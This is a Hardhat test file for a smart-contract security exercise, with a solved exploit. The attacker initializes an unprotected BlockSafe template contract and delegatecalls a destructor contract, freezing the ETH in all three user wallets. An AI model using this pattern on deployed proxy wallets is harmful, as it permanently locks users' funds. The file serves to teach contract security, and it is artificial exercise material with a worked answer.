const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Calls Attacks Exercise 4', function () {

    let deployer, user1, user2, user3, attacker;
    const CALL_OPERATION = 1;
    const DELEGATECALL_OPERATION = 2;

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, user3, attacker] = await ethers.getSigners();

        // Deploy ERC20 Token
        const TokenFactory = await ethers.getContractFactory(
            'contracts/utils/DummyERC20.sol:DummyERC20',
            deployer
        );
        this.token = await TokenFactory.deploy("Dummy ERC20", "DToken", ethers.utils.parseEther('1000'))

        // Deploy Template and Factory
        const BlockSafeTemplateFactory = await ethers.getContractFactory(
            'contracts/call-attacks-4/BlockSafe.sol:BlockSafe',
            deployer
        );
        this.blockSafeTemplate = await BlockSafeTemplateFactory.deploy();
        const BlockSafeFactoryFactory = await ethers.getContractFactory(
            'contracts/call-attacks-4/BlockSafeFactory.sol:BlockSafeFactory',
            deployer
        );
        this.blockSafeFactory = await BlockSafeFactoryFactory.deploy(
            deployer.address, this.blockSafeTemplate.address
        );

        // User1 creating CryptoKeepers
        const User1Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user1.address));
        const blockSafe1Address = await this.blockSafeFactory.predictBlockSafeAddress(User1Salt);
        await this.blockSafeFactory.connect(user1).createBlockSafe(User1Salt, [user1.address])
        this.blockSafe1 = await ethers.getContractAt(
            'contracts/call-attacks-4/BlockSafe.sol:BlockSafe',
            blockSafe1Address
        );
        // User2 creating CryptoKeepers
        const User2Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user2.address));
        const blockSafe2Address = await this.blockSafeFactory.predictBlockSafeAddress(User2Salt);
        await this.blockSafeFactory.connect(user2).createBlockSafe(User2Salt, [user2.address])
        this.blockSafe2 = await ethers.getContractAt(
            'contracts/call-attacks-4/BlockSafe.sol:BlockSafe',
            blockSafe2Address
        );
        // User3 creating CryptoKeepers
        const User3Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user3.address));
        const blockSafe3Address = await this.blockSafeFactory.predictBlockSafeAddress(User3Salt);
        await this.blockSafeFactory.connect(user3).createBlockSafe(User3Salt, [user3.address])
        this.blockSafe3 = await ethers.getContractAt(
            'contracts/call-attacks-4/BlockSafe.sol:BlockSafe',
            blockSafe3Address
        );
        

        // Users load their Block Safe with some ETH
        await user1.sendTransaction({
            to: this.blockSafe1.address,
            value: ethers.utils.parseEther('10')
        });
        await user2.sendTransaction({
            to: this.blockSafe2.address,
            value: ethers.utils.parseEther('10')
        });
        await user3.sendTransaction({
            to: this.blockSafe3.address,
            value: ethers.utils.parseEther('10')
        });

        // Block Safe operation works
        this.blockSafe1.connect(user1).executeWithValue(
            user2.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
        )
        this.blockSafe2.connect(user2).executeWithValue(
            user1.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
        )
        this.blockSafe3.connect(user3).executeWithValue(
            user1.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
        )

        // Only operator can manage wallet
        // addOperator fails
        await expect(this.blockSafe1.connect(user2).addOperator(user2.address)).to.be.revertedWith("Not an operator")
        // executeWithValue fails
        await expect(this.blockSafe1.connect(user2).executeWithValue(
            user2.address, "0x", ethers.utils.parseEther('1'))).to.be.revertedWith("Not an operator")
        // execute fails
        const callData = TokenFactory.interface.encodeFunctionData('balanceOf', [deployer.address])
        await expect(this.blockSafe1.connect(user2).execute(
            this.token.address, callData, CALL_OPERATION)).to.be.revertedWith("Not an operator");

        this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
        
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        const DestructorFactory = await ethers.getContractFactory(
            'contracts/call-attacks-4/solution/BlockSafeDestructor.sol:BlockSafeDestructor',
            deployer
        );
        this.destructor = await DestructorFactory.deploy();
        await this.blockSafeTemplate.connect(attacker).initialize([attacker.address]);

        await this.blockSafeTemplate.connect(attacker).execute(this.destructor.address, "0x", DELEGATECALL_OPERATION)

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All safes should be non functional and frozen
        // And we can't withdraw ETH from the safes
        let safe1BalanceBefore = await ethers.provider.getBalance(this.blockSafe1.address)
        await this.blockSafe1.connect(user1).executeWithValue(
            user1.address, "0x", ethers.utils.parseEther('10')
        )
        expect(await ethers.provider.getBalance(this.blockSafe1.address)).to.eq(safe1BalanceBefore)

        let safe2BalanceBefore = await ethers.provider.getBalance(this.blockSafe2.address)
        await this.blockSafe2.connect(user2).executeWithValue(
            user2.address, "0x", ethers.utils.parseEther('10')
        )
        expect(await ethers.provider.getBalance(this.blockSafe2.address)).to.eq(safe2BalanceBefore)

        let safe3BalanceBefore = await ethers.provider.getBalance(this.blockSafe3.address)
        await this.blockSafe3.connect(user3).executeWithValue(
            user3.address, "0x", ethers.utils.parseEther('10')
        )
        expect(await ethers.provider.getBalance(this.blockSafe3.address)).to.eq(safe3BalanceBefore)

    });
});
